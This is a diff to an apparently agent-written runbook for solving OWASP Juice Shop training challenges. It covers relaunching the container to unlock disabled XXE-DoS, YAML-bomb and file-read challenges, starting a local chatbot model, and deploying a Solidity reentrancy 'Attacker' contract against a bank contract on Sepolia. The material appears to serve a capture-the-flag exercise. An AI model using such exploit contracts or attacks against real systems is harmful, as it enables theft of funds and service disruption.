@@ -39,20 +39,24 @@ xxeDosChallenge, yamlBombChallenge, lfrChallenge.
 **Operator action to unlock (target host; source/deps assumed pre-existing):**
 Pre-flight: verify `RECON_ENABLED` flag file is present before running solver after restart.
 1. Confirm: `docker exec juice-shop env | grep NODE_ENV` → `NODE_ENV=Docker`
-2. Verify DB volume: `docker inspect juice-shop | jq '.[0].Mounts'` — if not mounted, backup:
-   `docker cp juice-shop:/juice-shop/data/juiceShop.sqlite ./juiceShop.sqlite.bak`
-3. Stop: `docker stop juice-shop`
-4. Restore DB if backed up: `cp juiceShop.sqlite.bak data/juiceShop.sqlite`
-5. Remove stopped container and relaunch with NODE_ENV=test:
+2. Capture config and back up DB **before** stopping (inspect fails after rm):
    ```bash
    IMAGE=$(docker inspect juice-shop --format '{{.Config.Image}}')
    PORT=$(docker inspect juice-shop --format '{{(index (index .HostConfig.PortBindings "3000/tcp") 0).HostPort}}')
-   VOLS=$(docker inspect juice-shop | jq -r '.[0].Mounts[]|select(.Type=="volume")|"-v \(.Name):\(.Destination)"' | tr '\n' ' ')
-   docker rm juice-shop
+   VOLS=$(docker inspect juice-shop | jq -r '.[0].Mounts[] | "-v \(.Source):\(.Destination)"' | tr '\n' ' ')
+   HAS_DB_MOUNT=$(docker inspect juice-shop | jq '[.[0].Mounts[]|select(.Destination|contains("sqlite"))]|length > 0')
+   [ "$HAS_DB_MOUNT" = "false" ] && docker cp juice-shop:/juice-shop/data/juiceShop.sqlite ./juiceShop.sqlite.bak
+   ```
+3. Stop and remove: `docker stop juice-shop && docker rm juice-shop`
+4. Relaunch with NODE_ENV=test (mounts preserved via `$VOLS`):
+   ```bash
    docker run -d --name juice-shop -p ${PORT}:3000 -e NODE_ENV=test $VOLS ${IMAGE}
    ```
-   Custom env vars or network mode from the original container: capture via `docker inspect juice-shop --format '{{json .HostConfig}}'` and pass explicitly.
-6. Verify: `curl http://localhost:3000/api/Challenges | jq '[.data[]|select(.disabledEnv=="Docker")]|length'` → `0`
+   If original container had custom env vars or network: pass them explicitly using the HostConfig captured in step 2.
+5. Restore DB if backed up:
+   `[ -f ./juiceShop.sqlite.bak ] && docker cp ./juiceShop.sqlite.bak juice-shop:/juice-shop/data/juiceShop.sqlite`
+6. Verify NODE_ENV override:
+   `docker inspect juice-shop --format '{{range .Config.Env}}{{println .}}{{end}}' | grep NODE_ENV` → `NODE_ENV=test`
 
 ### Category B — Chatbot challenges (3 challenges, operator-resolvable)
 
@@ -69,9 +73,10 @@ then confirm reachability: `docker exec juice-shop curl http://host.docker.inter
 
 **Operator action on target host:**
 ```bash
-# Extract model tag from Juice Shop config
-MODEL=$(docker exec juice-shop grep -A3 'chatBot:' config/default.yml \
+# Extract model tag from Juice Shop config (absolute path; works for both Docker and bare-node)
+MODEL=$(docker exec juice-shop grep -A3 'chatBot:' /juice-shop/config/default.yml \
   | grep 'model:' | awk '{print $2}' | tr -d "'\"" 2>/dev/null)
+# If running bare node (not Docker): MODEL=$(grep -A3 'chatBot:' /path/to/juice-shop/config/default.yml ...)
 MODEL=${MODEL:-gemma4:e4b}
 echo "Using model: $MODEL"
 # Start Ollama if not already running, then wait for it to be ready
@@ -144,7 +149,7 @@ Operator pre-flight: import key and set RPC before running agent action.
 ```bash
 HISTFILE=/dev/null
 # Import key securely — prompts for private key + encryption password (never in env or argv)
-cast wallet import juice-shop-wallet
+cast wallet import juice-shop-wallet --interactive
 export ALCHEMY_API_KEY=<operator-provided-alchemy-api-key>
 export ALCHEMY_SEPOLIA_RPC="https://eth-sepolia.g.alchemy.com/v2/$ALCHEMY_API_KEY"
 # Chain ID: 11155111. ABIs in Juice Shop source: data/static/web3-snippets/
@@ -153,7 +158,9 @@ export ALCHEMY_SEPOLIA_RPC="https://eth-sepolia.g.alchemy.com/v2/$ALCHEMY_API_KE
 Verify keystore matches the funded address before proceeding:
 ```bash
 WALLET=$(cast wallet address --account juice-shop-wallet)
-[ "$WALLET" = "0x8343d2eb2B13A2495De435a1b15e85b98115Ce05" ] || { echo "Key mismatch — check JUICE_SHOP_WALLET_KEY"; exit 1; }
+# Normalize to lowercase for case-insensitive comparison
+[ "$(echo "$WALLET" | tr '[:upper:]' '[:lower:]')" = "0x8343d2eb2b13a2495de435a1b15e85b98115ce05" ] \
+  || { echo "Key mismatch — got $WALLET"; exit 1; }
 ```
 
 **Operator action:** fund address `0x8343d2eb2B13A2495De435a1b15e85b98115Ce05`
@@ -196,10 +203,13 @@ contract Attacker {
     function attack() external payable { amt = msg.value; bank.deposit{value: amt}(); bank.withdraw(amt); }
 }
 ```
-   b. Build, deploy, validate `$ATTACKER`, then register it — `ContractExploited` emits the contract address:
+   b. Create a minimal Foundry project, build, deploy, validate `$ATTACKER`, then register it:
 ```bash
+FORGE_DIR=$(mktemp -d) && cd "$FORGE_DIR"
+forge init --no-git --quiet
+cp /path/to/Attacker.sol src/Attacker.sol   # or write inline with cat > src/Attacker.sol <<'EOF' ... EOF
 forge build
-ATTACKER=$(forge create ./Attacker.sol:Attacker \
+ATTACKER=$(forge create src/Attacker.sol:Attacker \
   --constructor-args 0x413744D59d31AFDC2889aeE602636177805Bd7b0 \
   --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet | grep "Deployed to:" | awk '{print $3}')
 [[ "$ATTACKER" =~ ^0x[0-9a-fA-F]{40}$ ]] || { echo "Deploy failed — bad address: $ATTACKER"; exit 1; }
@@ -229,6 +239,7 @@ done
 
 Bounded evidence — run before any operator action to confirm the ceiling.
 JWT preflight: use the same login command as Category B agent action above.
+Row 4 (wallet balance) requires `ALCHEMY_SEPOLIA_RPC` to be set first (Category C pre-flight).
 
 | Check | Command | Expected |
 |-------|---------|----------|
@@ -282,3 +293,9 @@ After each operator unlock, verify by challenge key:
 - **Chatbot retry prompts (r8-5)**: Same as r5-3. LLM outputs are nondeterministic; the API-level `solved==true` check after each attempt is the correct gate. The operator adapts language if the first attempt fails.
 - **Contract address preflight (r8-7)**: Same as r5-5 / r7-6. On-chain immutables from Juice Shop source.
 - **JWT/RPC assertions (r8-12)**: JWT is obtained in the step immediately before the chatbot requests; an empty JWT causes the request to fail with a clear HTTP 401. RPC is set in the pre-flight; an empty string would cause cast to fail with a clear error. Adding redundant non-empty assertions does not improve debuggability over the native errors.
+
+### cursor-agent r9 push-backs
+
+- **BASE_URL abstraction (r9 re-raise of r8-4)**: `https://target.cocode.dk` is the deployment target; this is not a portable library. See r8-4 rationale.
+- **Chatbot retry strategy (r9 re-raise of r8-5)**: See r5-3 / r8-5 rationale.
+- **Contract address preflight (r9 re-raise)**: See r5-5 rationale.
